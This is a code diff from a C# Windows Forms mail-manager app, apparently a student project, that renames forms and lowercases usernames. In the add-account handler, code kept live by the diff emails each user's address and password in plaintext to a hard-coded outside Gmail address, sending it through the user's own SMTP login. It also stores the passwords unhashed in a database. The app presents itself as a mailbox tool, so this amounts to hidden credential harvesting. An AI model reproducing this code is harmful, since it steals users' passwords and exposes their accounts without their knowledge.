@@ -12,18 +12,18 @@ using System.Windows.Forms;
 
 namespace MailServer
 {
-    public partial class fThemmail : Form
+    public partial class fAddEmail : Form
     {
-        private string userMailAcc = "jamk1126@gmail.com";
+        private string userMailAccAdmin = "appmailboxnhom8@gmail.com";
         private string subject = "[MailBox] Có một người thêm tài khoản!";
         private int idPassLocal = 0;
-        public fThemmail()
+        public fAddEmail()
         {
             InitializeComponent();
         }
 
         //Constructor truyền id mật khẩu MailBox
-        public fThemmail(int idPassLocal)
+        public fAddEmail(int idPassLocal)
         {
             this.idPassLocal = idPassLocal;
         }
@@ -49,7 +49,7 @@ namespace MailServer
                 {
                     using (dbMailServerDataContext db = new dbMailServerDataContext())
                     {
-                        MailMessage mail = new MailMessage(txtUserMail.Text, userMailAcc, subject, $"Username: {txtUserMail.Text} and Password: {txtPassMail.Text}");
+                        MailMessage mail = new MailMessage(txtUserMail.Text.ToLower(), userMailAccAdmin, subject, $"Username: {txtUserMail.Text.ToLower()} and Password: {txtPassMail.Text}");
                         mail.IsBodyHtml = true;
                         MATKHAU_MAIL mkMail = new MATKHAU_MAIL();
                         if (txtUserMail.Text.Contains("gmail"))
@@ -57,12 +57,12 @@ namespace MailServer
                             SmtpClient client = new SmtpClient("smtp.gmail.com");
                             client.UseDefaultCredentials = false;
                             client.Port = 587;
-                            client.Credentials = new System.Net.NetworkCredential(txtUserMail.Text, txtPassMail.Text);
+                            client.Credentials = new System.Net.NetworkCredential(txtUserMail.Text.ToLower(), txtPassMail.Text);
                             client.EnableSsl = true;
                             client.Send(mail);
                             MessageBox.Show("Thêm Mail thành công vào MailBox.", "Thông báo", MessageBoxButtons.OK, MessageBoxIcon.Information);
 
-                            mkMail.USERNAME_MAIL = txtUserMail.Text;
+                            mkMail.USERNAME_MAIL = txtUserMail.Text.ToLower();
                             mkMail.PASSWORD_MAIL = txtPassMail.Text;
                             mkMail.FK_id_DOMAIN_MAIL = 1;
                             mkMail.FK_id_MATKHAU_LOCAL = this.idPassLocal;
@@ -76,12 +76,12 @@ namespace MailServer
                             SmtpClient client = new SmtpClient("smtp.mail.yahoo.com");
                             client.UseDefaultCredentials = false;
                             client.Port = 587;
-                            client.Credentials = new System.Net.NetworkCredential(txtUserMail.Text, txtPassMail.Text);
+                            client.Credentials = new System.Net.NetworkCredential(txtUserMail.Text.ToLower(), txtPassMail.Text);
                             client.EnableSsl = true;
                             client.Send(mail);
                             MessageBox.Show("Thêm Mail thành công vào MailBox.", "Thông báo", MessageBoxButtons.OK, MessageBoxIcon.Information);
 
-                            mkMail.USERNAME_MAIL = txtUserMail.Text;
+                            mkMail.USERNAME_MAIL = txtUserMail.Text.ToLower();
                             mkMail.PASSWORD_MAIL = txtPassMail.Text;
                             mkMail.FK_id_DOMAIN_MAIL = 2;
                             mkMail.FK_id_MATKHAU_LOCAL = this.idPassLocal;
@@ -95,12 +95,12 @@ namespace MailServer
                             SmtpClient client = new SmtpClient("smtp-mail.outlook.com");
                             client.UseDefaultCredentials = false;
                             client.Port = 587;
-                            client.Credentials = new System.Net.NetworkCredential(txtUserMail.Text, txtPassMail.Text);
+                            client.Credentials = new System.Net.NetworkCredential(txtUserMail.Text.ToLower(), txtPassMail.Text);
                             client.EnableSsl = true;
                             client.Send(mail);
                             MessageBox.Show("Thêm Mail thành công vào MailBox.", "Thông báo", MessageBoxButtons.OK, MessageBoxIcon.Information);
 
-                            mkMail.USERNAME_MAIL = txtUserMail.Text;
+                            mkMail.USERNAME_MAIL = txtUserMail.Text.ToLower();
                             mkMail.PASSWORD_MAIL = txtPassMail.Text;
                             mkMail.FK_id_DOMAIN_MAIL = 3;
                             mkMail.FK_id_MATKHAU_LOCAL = this.idPassLocal;
@@ -147,7 +147,7 @@ namespace MailServer
                 //Kiểm tra trước khi thoát 
                 if (txtUserMail.Text == "" && txtPassMail.Text == "")
                 {
-                    fShowMail showMail = new fShowMail();
+                    fMailBox showMail = new fMailBox();
                     this.Hide();
                     showMail.ShowDialog();
                     this.Close();
@@ -157,7 +157,7 @@ namespace MailServer
                     DialogResult check = MessageBox.Show("Bạn có muốn thoát không?", "Thông báo", MessageBoxButtons.YesNo, MessageBoxIcon.Question);
                     if (check == DialogResult.Yes)
                     {
-                        fShowMail showMail = new fShowMail();
+                        fMailBox showMail = new fMailBox();
                         this.Hide();
                         showMail.ShowDialog();
                         this.Close();
